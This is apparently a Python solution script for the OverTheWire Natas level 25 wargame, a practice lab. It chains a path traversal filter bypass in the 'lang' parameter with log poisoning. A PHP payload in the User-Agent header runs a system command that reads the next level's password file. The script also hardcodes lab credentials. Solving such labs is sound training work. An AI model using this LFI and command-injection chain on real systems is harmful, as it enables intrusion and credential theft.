#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

# this first request because we first need to initiate a session
# to get its 'PHPSESSID' key
response = session.post(url, auth=(username, password))

# in the second request we have an open session, so we got our
# 'PHPSESSID' key to be still valid thus we can use it
# in that '.logs' file we can see:
# -> all of our failed attempts to 'LFI' the server
# -> and more important we can see the 'User-Agent' header in the first line
# and as we are doing that through a python script, we can easily change
# that header to whatever we want like, even to a php_shell, or a php include command

post_data = {
    "lang": "..././..././..././..././..././var/www/natas/natas25/logs/natas25_"
}
id = session.cookies["PHPSESSID"]
post_data["lang"] += str(id) + ".log"

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26');?>"}

response = session.post(url, data=post_data, headers=headers, auth=(username, password))
content = response.text

soup = BeautifulSoup(content, "html.parser").prettify()


print(soup)
print("=" * 80)


# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas26
# Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
